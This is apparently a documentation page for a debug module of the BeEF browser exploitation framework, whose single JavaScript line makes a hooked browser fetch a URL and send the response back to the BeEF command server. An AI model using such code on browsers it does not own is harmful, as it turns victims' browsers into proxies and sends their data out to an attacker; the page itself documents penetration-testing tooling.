## Summary

* **Objective**: Test the beef.net.request function by retrieving a URL.
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/debug/test_network_request)

## Internal Working

```js
beef.net.request(scheme, method, domain, port, path, anchor, data, timeout, dataType, function(response) { beef.net.send("<%= @command_url %>", <%= @command_id %>, JSON.stringify(response)); } )
```


## Feedback
